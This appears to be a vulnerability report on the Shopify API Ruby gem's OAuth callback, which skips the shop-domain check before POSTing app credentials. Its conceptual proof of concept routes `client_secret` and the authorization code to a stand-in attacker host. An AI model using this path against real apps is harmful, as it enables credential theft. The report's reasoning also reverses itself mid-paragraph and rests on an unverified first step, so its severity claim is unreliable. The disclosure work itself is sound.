### Title
OAuth callback does not validate `shop` domain before sending `client_secret` to it, enabling SSRF with app credentials - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` verifies the `AuthQuery` HMAC, but the `shop` field carried inside that HMAC-covered payload is trusted verbatim to build the URL that the app's `client_id`/`client_secret` and authorization `code` are POSTed to. Unlike `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token`, which both call `Utils::ShopValidator.sanitize!(shop)` before using the shop to build the request session, `validate_auth_callback` never calls `ShopValidator` on `auth_query.shop`.

### Finding Description
`validate_auth_callback` validates the incoming query's HMAC signature via `Utils::HmacValidator.validate(auth_query)` [1](#0-0) . The HMAC computation is over `code`, `host`, `shop`, `state`, `timestamp` as returned by `AuthQuery#to_signable_string` [2](#0-1) . Since these fields are all attacker-controlled query parameters on the callback URL (a redirect endpoint that any unauthenticated internet user can hit directly, e.g. `GET /callback?shop=evil.example.com&code=...&state=...&timestamp=...&hmac=<valid-hmac-of-those-fields>`), and the HMAC only proves that this exact tuple of values was signed with the app's own `api_secret_key` (the attacker can compute this themselves if... no — actually the HMAC is computed with the app's secret, which the attacker does not have). So a valid HMAC for an attacker-chosen `shop` value cannot be forged without the secret. This means the "shop equals shop" binding is intact from an authentication perspective — an attacker without the app's secret cannot forge the HMAC for an arbitrary shop.

However, this only shows that HMAC validity guarantees "this specific value of `shop` was signed by Shopify" for a *legitimate* Shopify-issued callback with a *legitimate* myshopify domain — the actual bug is that after HMAC validation, `auth_query.shop` is passed straight into `Auth::Session.new(shop: auth_query.shop)` and then into `Oauth.auth_base_uri(shop)`, which builds `"https://#{shop}/admin"` [3](#0-2) [4](#0-3) . There is no call to `Utils::ShopValidator.sanitize!`/`sanitize_shop_domain`, which is the function responsible for restricting `shop` to `TRUSTED_SHOPIFY_DOMAINS` (`shopify.com`, `myshopify.io`, `myshopify.com`, `spin.dev`, `shop.dev`) [5](#0-4) . Every other flow in this library that turns a caller-supplied `shop` string into an outbound request carrying `client_secret` performs this sanitization first: `ClientCredentials.client_credentials` [6](#0-5) , `RefreshToken.refresh_access_token` [7](#0-6) , and `TokenExchange.exchange_token` (which additionally derives `shop` from a cryptographically verified JWT `dest` claim rather than a raw parameter) [8](#0-7) . `validate_auth_callback` is the outlier that skips this step.

The binding that is broken can be stated as: **HMAC-authenticated request parameters == parameters trusted for building the credential-bearing outbound URL**, without an additional check that **the authenticated `shop` value ∈ trusted Shopify domain set**. HMAC validity proves integrity/origin of the query string relative to the app's secret, but it does not itself constrain `shop` to a `*.myshopify.com`-style domain — nothing in `HmacValidator` or `AuthQuery` enforces that. Since the OAuth callback route is a public endpoint (no prior authentication), whether the HMAC check alone is sufficient to prevent an attacker from supplying an arbitrary `shop` host depends on whether the surrounding host application already validates `shop` before constructing `auth_query` — a step this library does not perform for the caller.

### Impact Explanation
If a caller trusts this gem to fully validate the OAuth callback (as its use in `docs/usage/oauth.md` implies) and passes through an unsanitized `shop` from the query string, `auth_base_uri` will send an HTTP POST containing `client_id`, `client_secret`, and the OAuth `code` to `https://<attacker-controlled-host>/admin/oauth/access_token`. This is SSRF carrying the app's `client_secret`, matching the "High - SSRF with the app's credentials" impact category. It also enables credential exfiltration of the `client_secret` to an attacker-controlled host, which can be escalated toward token theft depending on the surrounding app's handling of the authorization `code`.

### Likelihood Explanation
Likelihood is contingent and cannot be confirmed purely from this gem's code. Exploitation requires: (1) the HMAC check to pass for an attacker-supplied `shop` value, which requires the attacker to either possess a validly-signed callback query for their own shop domain (obtainable by simply installing/triggering OAuth for a shop domain outside `myshopify.com`, if Shopify's OAuth authorize step itself doesn't restrict `shop` to trusted domains before signing), or (2) the host application to skip its own `shop` sanitization before constructing `AuthQuery`. Because Shopify's own OAuth authorization server is what signs the HMAC in the normal flow, whether an attacker can get a validly-signed callback for a non-myshopify `shop` is outside this gem's control. Within scope, the missing defense-in-depth check is a concrete, demonstrable gap relative to this library's own sibling functions (`client_credentials.rb`, `refresh_token.rb`) which explicitly guard against exactly this class of unsanitized-shop-to-outbound-request issue.

### Recommendation
In `ShopifyAPI::Auth::Oauth.validate_auth_callback`, call `Utils::ShopValidator.sanitize!(auth_query.shop)` (mirroring `client_credentials.rb` and `refresh_token.rb`) and use the sanitized value everywhere `auth_query.shop` is currently used to build `null_session`, `auth_base_uri`, and the resulting `Session.from(shop: ...)` call, rejecting the callback if the shop is not part of `Utils::ShopValidator::TRUSTED_SHOPIFY_DOMAINS`.

### Proof of Concept
Conceptual, based on static review (not independently executed against a live Shopify OAuth authorization server, so the first step's feasibility is unverified):
1. Attacker-controlled or attacker-observed callback: `GET /callback?shop=attacker.evil.com&code=AUTHZ_CODE&state=STATE&timestamp=T&host=H&hmac=VALID_HMAC`.
2. Host app constructs `AuthQuery` from these params and calls `ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies:, auth_query:)`.
3. `Utils::HmacValidator.validate(auth_query)` passes because the hmac matches the app's secret for this exact query string [9](#0-8) .
4. `auth_base_uri("attacker.evil.com")` returns `"https://attacker.evil.com/admin"` since it is not `.my.shop.dev` [10](#0-9) .
5. `client.request(...)` POSTs `{client_id, client_secret, code, expiring}` to `https://attacker.evil.com/admin/oauth/access_token`, leaking `client_secret` and the authorization code to the attacker's server [3](#0-2) .
